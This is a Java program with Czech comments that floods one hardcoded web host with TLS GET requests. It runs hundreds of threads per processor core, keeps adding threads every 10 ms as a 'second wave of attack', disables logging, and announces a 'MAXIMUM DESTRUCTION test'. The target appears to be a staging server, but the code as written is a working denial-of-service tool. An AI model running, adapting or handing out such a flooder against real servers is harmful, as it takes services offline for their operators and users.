package com.raska;

import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.net.InetSocketAddress;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

class SenderThread implements Runnable {
  private final String host;
  private final int port;
  private static final byte[] REQUEST;
  private static final int SOCKET_TIMEOUT = 500; // Extrémně krátký timeout

  static {
    String req = "GET /hutni-material HTTP/1.1\r\n" +
            "Host: pro-doma.cz.uat.blueghost.cz\r\n" +
            "Connection: keep-alive\r\n" + // Změna na keep-alive pro větší zátěž
            "\r\n";
    REQUEST = req.getBytes(StandardCharsets.UTF_8);
  }

  public SenderThread(String wwwHost, int wwwPort) {
    this.host = wwwHost;
    this.port = wwwPort;
  }

  public void run() {
    while (!Thread.currentThread().isInterrupted()) {
      SSLSocket s = null;
      try {
        s = (SSLSocket) SSLSocketFactory.getDefault().createSocket();
        s.setTcpNoDelay(true);
        s.setSoTimeout(SOCKET_TIMEOUT);
        s.connect(new InetSocketAddress(host, port), SOCKET_TIMEOUT);
        s.setEnabledProtocols(new String[]{"TLSv1.2"});
        s.startHandshake();


        for(int i = 0; i < 100; i++) {
          try (OutputStream out = s.getOutputStream()) {
            out.write(REQUEST);
            out.flush();
          } catch(Exception ignored) {
            break;
          }
        }

      } catch (Exception ignored) {
      } finally {
        try {
          if (s != null) s.close();
        } catch (Exception ignored) {}
      }
    }
  }
}

public class Main {
  public static void main(String[] args) throws Exception {
    String host = "pro-doma.cz.uat.blueghost.cz";
    int port = 443;

    // Maximální počet vláken - použijeme počet dostupných procesorů * 500
    int threads = Runtime.getRuntime().availableProcessors() * 500;

    if (args.length > 0) {
      threads = Integer.parseInt(args[0]);
    }

    // Velmi nizke casy nastavení timeoutů
    System.setProperty("sun.net.client.defaultConnectTimeout", "500");
    System.setProperty("sun.net.client.defaultReadTimeout", "500");

    // Vypnutí veškerého logování
    java.util.logging.LogManager.getLogManager().reset();

    System.out.println("Starting MAXIMUM DESTRUCTION test against: " + host);
    System.out.println("Threads: " + threads);
    System.out.println("Press Enter to stop...");

    // Použití cached thread poolu pro maximální zatez
    ExecutorService executor = Executors.newCachedThreadPool();

    // Spuštění maximálního počtu vláken najednou
    for (int i = 0; i < threads; i++) {
      executor.submit(new SenderThread(host, port));
    }

    // Druhá vlna útoku - periodické přidávání nových vláken
    Thread spawner = new Thread(() -> {
      while (!Thread.currentThread().isInterrupted()) {
        try {
          executor.submit(new SenderThread(host, port));
          Thread.sleep(10); // Každých 10ms nové vlákno
        } catch (Exception ignored) {
          break;
        }
      }
    });
    spawner.start();

    // Čekání na Enter
    System.in.read();

    System.out.println("Stopping the carnage...");
    spawner.interrupt();
    executor.shutdownNow();

    System.out.println("Test stopped.");
    System.exit(0); // Násilné ukončení
  }
}